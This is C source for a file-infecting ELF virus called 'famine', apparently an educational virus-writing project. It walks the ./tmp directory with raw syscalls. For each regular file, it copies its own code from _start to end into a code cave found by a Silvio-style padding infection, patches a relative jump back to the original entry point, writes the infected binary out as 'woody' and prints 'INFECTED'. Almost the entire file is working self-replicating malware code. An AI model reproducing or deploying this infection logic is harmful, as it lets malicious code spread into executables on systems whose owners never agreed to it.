#include <sys/stat.h>
#include <sys/mman.h>
#include <dirent.h>
#include <fcntl.h>
#include "famine.h"
#include <elf.h>
#include <sys/syscall.h>
#include "map.h"
#include "utils.h"
#include "silvio.h"

#include <sys/types.h>
#ifndef NULL
#define NULL ((void *)0)
#endif

extern void end();
void famine(void);

// utils
struct linux_dirent64 {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[];
};


void	_start(void)
{
	famine();
	__asm__ volatile ("jmp end");
}

int	patch_new_file(t_data *data) {

	char woody[] = "woody";

	int fd = _syscall(SYS_open, woody, O_CREAT | O_WRONLY | O_TRUNC, 0755);
	if (fd == -1)
		return 1;

	if (_syscall(SYS_write, fd, data->file, data->size) == -1) {
		_syscall(SYS_close, fd);
		return 1;
	}


	_syscall(SYS_close, fd);

	return 0;
}

#define JMP_OFFSET 9
#define JMP_SIZE 5

int	calculate_jmp(t_data *data, size_t payload_size) {

		data->cave.rel_jmp =  \
		(int64_t)data->cave.old_entry -  \
		((int64_t)data->cave.addr + JMP_OFFSET + JMP_SIZE);

	return 0;
}

void modify_jmp(char *jmp, int64_t value) {
	for (size_t i = 4; i > 0; i--) {
		jmp[4 - i] = value & 0xFF;
		value >>= 8;
	}
}
	

int	inject(t_data *data) {

	char jmp[] = "\xe9\x00\x00\x00\x00";
	
	unsigned long size =  (char *)&end - (char *)&_start;

	if (silvio(data, size) == -1)
		return 1;

	calculate_jmp(data, size);


	modify_jmp(jmp + 1, data->cave.rel_jmp);

	ft_memcpy(data->file + data->cave.offset, _start, size - 1);

	ft_memcpy(data->file + data->cave.offset + JMP_OFFSET, jmp, JMP_SIZE);

	patch_new_file(data);

	return 0;
}

int	infect(const char *filename)
{
	size_t size = 0;
	uint8_t *file = map_file(filename, &size);
	if (!file) {
		return 1;
	}

	t_data data;
	init_data(&data, file, size);

	if (inject(&data) == 1) {
		free_data(&data);
		return 1;
	}

	free_data(&data);
	return 0;
}

void	open_file(char *file)
{
	int fd = _syscall(SYS_open, file, O_RDONLY);
	if (fd < 0)
		return ;

	char buf[PATH_MAX];
	struct linux_dirent64 *dir;
	ssize_t ret;

	for(;;)
	{
		ret = _syscall(SYS_getdents64, fd, buf, PATH_MAX);
		if (ret <= 0)
			break;
		for (size_t i = 0; i < ret; i += dir->d_reclen)
		{
			dir = (struct linux_dirent64 *)(buf + i);

			if (dir->d_name[0] == '.'
					&& (dir->d_name[1] == '\0' || (dir->d_name[1] == '.' && dir->d_name[2] == '\0')))
				continue;
			
			if (dir->d_type == DT_REG) {
				char new_path[PATH_MAX];
				make_path(new_path, file, dir->d_name);
				//_syscall(SYS_write, 1, new_path, ft_strlen(new_path));
				char msg[] = "INFECTED\n";
				if (infect(new_path) == 0) {
					_syscall(SYS_write, 1, msg, sizeof(msg) - 1);
				}
			}
		}
	}

	_syscall(SYS_close, fd);

}



void	famine(void)
{

	char p1[] = "./tmp";
	char *paths[] = {
		p1,
		(void *)0,
	};

	for (int i = 0; paths[i]; i++)
		open_file(paths[i]);

}
